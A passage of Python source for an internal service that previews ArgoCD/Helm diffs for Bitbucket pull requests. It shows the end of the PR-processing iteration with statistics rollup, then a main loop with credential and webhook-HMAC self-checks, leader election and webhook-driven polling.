            if pr["source"]["commit"]["hash"] != base_sha:
                work.append((pr, repo_map, base_sha, repo))
    if work:
        with ThreadPoolExecutor(max_workers=MAX_PR_WORKERS) as executor:
            futs = {executor.submit(process_pr, pr, rmap, bsha, repo): (pr, repo)
                    for pr, rmap, bsha, repo in work}
            for fut in as_completed(futs):
                try:
                    counts = fut.result()
                    if counts:
                        totals.update(counts)
                except Exception as exc:
                    pr, repo = futs[fut]
                    log(f"Unhandled error processing PR {repo}#{pr['id']}: {exc}", "ERROR")
                _touch_progress()  # C2 checkpoint: one PR finished processing

    # Iteration-level rollup across all PRs: a single line that shows whether
    # this cycle was healthy or how many app diffs could not be computed.
    elapsed_s = round(time.monotonic() - _iter_start, 1)
    bbs = bb_call_stats()
    bb_total = bbs["file_fetches"] + bbs["rest_calls"]
    with _diff_stats_lock:
        _diff_stats["last_iteration_s"] = elapsed_s
        _diff_stats["last_iteration_at"] = datetime.now(timezone.utc).isoformat()
        _diff_stats["last_iteration_bb_calls"] = bb_total
        _diff_stats["last_iteration_bb_429s"] = bbs["rate_limited"]
    bb_note = (f" | bitbucket: {bb_total} call(s) "
               f"({bbs['file_fetches']} file, {bbs['rest_calls']} rest)"
               + (f", {bbs['rate_limited']} rate limited" if bbs["rate_limited"] else "")
               + (f" | mirror served {bbs['mirror_reads']} file read(s)"
                  if bbs["mirror_reads"] else ""))
    if totals:
        rollup = ", ".join(f"{k}={v}" for k, v in sorted(totals.items()))
        unhealthy = totals.get(OUT_INDETERMINATE, 0) + totals.get(OUT_ERROR, 0)
        log(f"Iteration done [{elapsed_s}s] — diff outcomes: {rollup}"
            + (f" | {unhealthy} app diff(s) could not be computed" if unhealthy else "")
            + bb_note,
            severity=("WARNING" if unhealthy else "INFO"),
            bb_calls=bb_total, bb_file_fetches=bbs["file_fetches"],
            bb_rest_calls=bbs["rest_calls"], bb_rate_limited=bbs["rate_limited"],
            **{f"n_{k}": v for k, v in totals.items()})
    else:
        log(f"Iteration done [{elapsed_s}s]" + bb_note,
            bb_calls=bb_total, bb_rate_limited=bbs["rate_limited"])

# ── Main entry point (long-running Deployment mode) ───────────────────
def main():
    """Start health server, login to ArgoCD, then run poll loop until SIGTERM."""
    global _last_ok, _loop_idle, _leader
    log("acme-diff-preview starting (Deployment mode, helm-template diff)",
        version=APP_VERSION,
        argocd_server=ARGOCD_SERVER, argocd_user=ARGOCD_USER,
        bb_repos=";".join(f"{r}:{'|'.join(c['scopes']) or '*'}" for r, c in REPOS.items()),
        diff_workers=DIFF_WORKERS, pr_workers=MAX_PR_WORKERS,
        max_apps_per_run=MAX_APPS_PER_RUN, diff_timeout=DIFF_TIMEOUT,
        diff_retries=DIFF_RETRIES, warm_workers=WARM_WORKERS,
        kube_version=KUBE_VERSION, log_level=LOG_LEVEL, vertex_model=VERTEX_MODEL)

    # COPS-2575 self-check: a silently permissive pod after a secret-mount
    # problem is worth one log line. Never logs the value, only whether strict
    # verification is active, and therefore whether supersede hints are
    # trusted at all (an unauthenticated POST that can abort in-flight renders
    # would be a cheap denial of service, so hints need a verified sender).
    if BB_WEBHOOK_SECRET:
        log("Bitbucket webhook: HMAC strict mode active",
            hmac_strict=True, supersede_abort=SUPERSEDE_ABORT_ENABLED)
    else:
        log("Bitbucket webhook: BB_WEBHOOK_SECRET is EMPTY, permissive mode, "
            "any unsigned POST is accepted and supersede hints are ignored",
            "WARNING", hmac_strict=False, supersede_abort=False)

    # Self-check: the entire diff engine depends on an OCI pull, which needs
    # OCI_PASS. Without it _helm_login fails and EVERY diff returns "diff
    # unavailable". Fail loudly at startup instead of silently degrading.
    if not OCI_PASS:
        log("OCI_PASS is empty — helm OCI pulls will fail and every diff will be "
            "unavailable. Set secrets.ociPassKey/ociUserKey in the chart values.",
            "ERROR")
    else:
        log(f"OCI credentials present (user={OCI_USER})")
        # v2.5.25: periodic authenticated self-check of the OCI-pull path —
        # first run ~60s after start, so a deploy that breaks pulls (like the
        # 403 incident) turns into an ERROR log within a minute.
        _start_oci_selfcheck_loop()

    # Same class of silent-degradation risk as OCI_PASS above, but for
    # request AUTHENTICITY rather than the diff engine itself: _verify_bb_hmac
    # runs in permissive mode (accepts any unsigned request) when
    # BB_WEBHOOK_SECRET is empty — see its docstring. That fallback exists
    # for backward compat during rollout, but has no operational signal of
    # its own anywhere (no log, no /readyz field) — unlike OCI_PASS, whose
    # absence is loud both here and in /readyz. A misconfigured or rotated-
    # away secret would silently reopen the webhook to unsigned requests
    # with zero visibility. Log it the same way OCI_PASS is logged.
    if not BB_WEBHOOK_SECRET:
        log("BB_WEBHOOK_SECRET is empty — the Bitbucket webhook is running in "
            "PERMISSIVE mode and will accept unsigned requests. Set "
            "secrets.bbWebhookSecretKey in the chart values.", "WARNING")
    else:
        log("Bitbucket webhook HMAC verification is active")

    _start_health_server()
    _start_heartbeat()    # keep /healthz alive during long PR processing
    _get_subtask_pool()   # warm the shared thread pool before the first iteration
    log(f"Sub-task pool ready ({_SUBTASK_POOL_WORKERS} workers)")

    # Initial login — raises on failure so the container restarts immediately.
    argocd_login()
    log("ArgoCD login OK")

    # HA (leader election): the poll loop below runs only on the replica
    # holding the lease; everything already started above (health server,
    # webhooks, diff UI) keeps serving on every replica. With one replica
    # or off-cluster this trivially always elects itself.
    _leader = _make_leader_elector()
    _leader.start()

    _standby_logged = False
    while not _shutdown:
        if _should_run_iteration(_leader):
            if _standby_logged:
                log("[leader] this replica now owns the poll loop")
                _standby_logged = False
            try:
                main_iteration()
                _last_ok = time.monotonic()  # only bumped on a clean iteration
            except Exception as e:
                log(f"Unhandled error in main loop: {e}", "ERROR")
                # Do NOT bump _last_ok here — /healthz must reflect real staleness.
        elif not _standby_logged:
            log("[leader] standby: another replica owns the poll loop; "
                "serving HTTP only")
            _standby_logged = True
        if not _shutdown:
            # Webhook wakes the loop instantly (<1s). The 60s timeout is
            # just a safety net in case webhook delivery is ever unavailable.
            # HA note: the load balancer delivers each webhook to ONE
            # replica; when it lands on the standby, the standby relays it
            # to the leader (see _forward_webhook_to_leader), so the leader
            # still wakes in <1s. If the relay ever fails, the leader's own
            # safety-net tick below (60s worst case) is the backstop.
            # A standby uses a short 5s wait instead, so a leadership
            # handoff is picked up quickly. Both are known-safe, bounded
            # waits (never hangs), so the heartbeat keeps vouching for
            # liveness while the loop is legitimately doing nothing
            # (v2.5.2 C2). Guarded by the same lock _beat() reads it under,
            # for a clean, unambiguous happens-before relationship
            # (belt-and-braces on top of the GIL's own atomicity for a
            # single bool assignment).
            _idle_timeout = 60 if not _standby_logged else 5
            with _progress_lock:
                _loop_idle = True
            _woken = _wake.wait(timeout=_idle_timeout)
            with _progress_lock:
                _loop_idle = False
            # COPS-2575: record WHY the next iteration is about to run. A
            # webhook that has silently stopped arriving (deleted in
            # Bitbucket, ingress dropping the POST, secret drifted after a
            # rotation) leaves the code perfectly correct and the service
            # quietly running on the 60s poll. A ratio of safety-net ticks to
            # webhook wakes is what makes that visible.
            #
            # Event.wait() already returns the flag, so this needs no extra
            # is_set() call: asking the event a second time would both race
            # (a webhook can land in between) and couple the loop to a method
            # that test doubles for _wake are not required to provide.
            with _diff_stats_lock:
                if _standby_logged:
                    # COPS-2576: a standby pass runs no iteration whichever
                    # way its wait ended, and its 5s poll is not the safety
                    # net. Counting it in the pair below made the ratio the
                    # webhook-health alert reads meaningless on a standby
                    # (measured live: standby 414 "safety net" ticks vs the
                    # leader's 48 over the same 34 minutes), and a webhook
                    # wake here would pad the healthy side just as wrongly.
                    # The role is decided by the same variable that chose
                    # the wait timeout above, so this classification can
                    # never disagree with the wait that produced it.
                    _diff_stats["iters_standby_wait"] += 1
                    _diff_stats["last_iteration_trigger"] = "standby_wait"
                elif _woken:
                    _diff_stats["iters_webhook_triggered"] += 1
                    _diff_stats["last_iteration_trigger"] = "webhook"
                else:
                    _diff_stats["iters_safetynet_triggered"] += 1
                    _diff_stats["last_iteration_trigger"] = "safety_net"
            _wake.clear()

    log("Shutdown complete", "WARNING")

if __name__ == "__main__":
    main()